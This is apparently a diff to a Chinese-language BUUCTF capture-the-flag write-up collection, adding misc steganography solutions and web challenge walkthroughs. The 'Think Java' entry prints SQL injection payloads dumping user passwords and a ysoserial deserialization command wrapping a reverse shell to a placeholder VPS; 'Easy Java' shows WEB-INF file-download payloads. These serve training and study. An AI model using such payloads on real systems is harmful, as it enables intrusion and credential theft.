@@ -1201,6 +1201,96 @@ plt.show()
 
 得到一个二维码，扫码即得flag。
 
+### 48. [HBNIS2018]excel破解
+
+修改后缀为.zip，010打开搜索flag即可得到flag
+
+### 49. [HBNIS2018]来题中等的吧
+
+图片上是摩斯电码，解码包上flag提交即可。
+
+### 50. [ACTF新生赛2020]outguess
+
+对jpg图片中的备注进行核心价值观解码，得到abc，kali中使用outguess来进行提取：
+
+```shell
+outguess -k 'abc' -r mmm.jpg flag.txt 
+```
+
+### 51. 穿越时空的思念
+
+`Audacity`打开摩斯电码解密即得flag
+
+### 52. 谁赢了比赛？
+
+首先去kali中使用binwalk/foremost分离出一个rar压缩包，ARCHPR爆破出密码解压，得到一个gif，Stegsolve打开一帧一帧看：
+
+![image-20231227165333778](buu_wp.assets/image-20231227165333778.png)
+
+保存这一帧，继续StegSolve打开：
+
+![image-20231227165421782](buu_wp.assets/image-20231227165421782.png)。
+
+扫码即得flag
+
+### 53. [WUSTCTF2020]find_me
+
+备注中的信息盲文解密即可
+
+### 54. [SWPU2019]我有一只马里奥
+
+运行exe文件，得到输出：
+
+![image-20231227170230278](buu_wp.assets/image-20231227170230278.png)
+
+提示ntfs数据流,打开所在目录cmd:
+
+```shell
+notepad .\1.txt:flag.txt
+```
+
+或者使用工具 `ntfsstreamseditor.exe`：
+
+![image-20231227170739468](buu_wp.assets/image-20231227170739468.png)
+
+### 55. [GUET-CTF2019]KO
+
+Ook!编码
+
+### 56. [GXYCTF2019]gakki
+
+binwalk/foremost分离、ARCHPR爆破都没有问题，最后得到一个无规则字符串文本：
+
+![image-20231227172532822](buu_wp.assets/image-20231227172532822.png)
+
+词频统计：
+
+```python
+# -*- coding:utf-8 -*-
+#Author: mochu7
+alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+- =\\{\\}[]"
+strings = open('./flag.txt').read()
+
+result = {}
+for i in alphabet:
+	counts = strings.count(i)
+	i = '{0}'.format(i)
+	result[i] = counts
+
+res = sorted(result.items(),key=lambda item:item[1],reverse=True)
+for data in res:
+	print(data)
+
+for i in res:
+	flag = str(i[0])
+	print(flag[0],end="")
+
+```
+
+跑一下脚本得到flag
+
+### 57. [ACTF新生赛2020]base64隐写
+
 
 
 ## Web
@@ -1939,6 +2029,182 @@ calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(
 - PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
   - 删除空白符
   - 将某些字符转换为下划线（包括空格）
+
+### 19. (TBD)[网鼎杯 2020 朱雀组]Think Java
+
+使用IDEA打开给的class文件：
+
+![image-20231226142620644](buu_wp.assets/image-20231226142620644.png)
+
+发现导入了swagger-ui，那么便存在在线测试接口`swagger-ui.html`，访问看看：
+
+![image-20231226142826757](buu_wp.assets/image-20231226142826757.png)
+
+存在三个访问接口，而第三个`/common/test/sqlDict`对应于给的class中的：
+
+```java
+    @PostMapping({"/sqlDict"})
+    @Access
+    @ApiOperation("为了开发方便对应数据库字典查询")
+    public ResponseResult sqlDict(String dbName) throws IOException {
+        List<Table> tables = SqlDict.getTableData(dbName, "root", "abc@12345");
+        return ResponseResult.e(ResponseCode.OK, tables);
+    }
+```
+
+代码审计：
+
+对于dbName这个变量，在做数据库链接和数据查询的时候均是直接字符串拼接，所以存在SQL注入：
+
+```java
+dbName = "jdbc:mysql://mysqldbserver:3306/" + dbName;
+......
+String sql = "Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '" + dbName + "' and table_name='" + TableName + "';";
+
+```
+
+爆库：
+
+```
+dbName=myapp#' union select group_concat(SCHEMA_NAME)from(information_schema.schemata)#
+```
+
+![image-20231226143626793](buu_wp.assets/image-20231226143626793.png)
+
+爆表：
+
+```
+dbName=myapp#' union select group_concat(table_name)from(information_schema.tables)where(table_schema='myapp')#
+```
+
+爆列：
+
+```
+dbName=myapp#' union select group_concat(column_name)from(information_schema.columns)where((table_schema='myapp')and(table_name='user'))#
+```
+
+爆值：
+
+```
+dbName=myapp#' union select group_concat(id)from(user)#
+
+dbName=myapp#' union select group_concat(name)from(user)#
+
+dbName=myapp#' union select group_concat(pwd)from(user)#
+```
+
+如此就获得了一个用户信息，序号为`1`，name为`admin`，密码为`admin@Rrrr_ctf_asde`；
+
+登录（输入用户名密码的json字符串，在`/common/user/login`处try it out）：
+
+![image-20231226144019134](buu_wp.assets/image-20231226144019134.png)
+
+获得一串认证字符串：
+
+```
+Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu
+```
+
+百度下需要对着串认证字符串进行序列化分析：
+
+> 下方的特征可以作为序列化的标志参考:
+> 一段数据以rO0AB开头，你基本可以确定这串就是Java序列化base64加密的数据。
+> 或者如果以aced开头，那么他就是这一段Java序列化的16进制。
+
+使用burp 的**java Deserialization Scanner**插件对其进行分析，分析出可能存在的漏洞：
+
+![image-20231226144333120](buu_wp.assets/image-20231226144333120.png)
+
+接下来需要使用ysoserial来反弹shell，由于没有公网ip，所以暂时跳过，贴下百度到的解答：
+
+---
+
+使用工具：ysoserial
+
+我们这里用到的命令如下：
+
+```shell
+java -jar ysoserial-all.jar ROME "bash -c {echo,base64编码后的内容}|{base64,-d}|{bash,-i}" > 1.bin
+```
+
+
+进行base64编码的内容是：
+
+```shell
+bash -i >& /dev/tcp/vpsip/端口 0>&1
+```
+
+- 将vpsip和端口换成自己服务器ip和正在监听的端口之后，再对其进行base64编码。
+
+将编码后的内容填充到命令上，再通过ysoserial获得bin文件，拿到文件之后，我们还需要对其进行base64加密，这里使用的一个Python脚本。注意根据自己bin文件名字去更改代码，而且还要记得把bin文件和代码放在同一目录。输出打印的一大串字符串就是payload。
+
+```python
+import base64
+file=open("1.bin","rb")
+
+now = file.read()
+ba = base64.b64encode(now)
+print(ba)
+file.close()
+```
+
+
+获得payload之后，先在咱们的服务器上监听端口之后，在另一个接口处输入payload，来进行反弹shell，注意开头的Bearer保留。
+
+![image-20231226150802622](buu_wp.assets/image-20231226150802622.png)
+
+---
+
+### 20. [RoarCTF 2019]Easy Java
+
+访问靶机，有一个登录页面，以为是sql注入发现不能成功，点击下方的help跳转：
+
+![image-20231226154152984](buu_wp.assets/image-20231226154152984.png)
+
+跳转出来并不能下载：
+
+![image-20231226154218574](buu_wp.assets/image-20231226154218574.png)
+
+转成POST请求发送：
+
+![image-20231226154247236](buu_wp.assets/image-20231226154247236.png)
+
+可以下载不过flag并不在其中，查看是否存在`WEB-INF/web.xml`泄露，payload改为：
+
+```
+filename=WEB-INF/web.xml
+```
+
+可以下载，查看源码：
+
+```xml
+    <servlet>
+        <servlet-name>FlagController</servlet-name>
+        <servlet-class>com.wm.ctf.FlagController</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>FlagController</servlet-name>
+        <url-pattern>/Flag</url-pattern>
+    </servlet-mapping>
+```
+
+试试直接访问`/Flag`，发现500，继续把FlagController的class字节码下载下来：
+
+```
+filename=WEB-INF/classes/com/wm/ctf/FlagController.class
+```
+
+IDEA打开：
+
+```java
+String flag = "ZmxhZ3tlYWNiZTQxMS00MTc4LTQ5M2YtODQwZS0xNzU4NTY3YTkyNzV9Cg==";
+```
+
+base64解密下即为flag。
+
+### 21. [网鼎杯 2020 青龙组]filejava
+
+
 
 ## Others
 
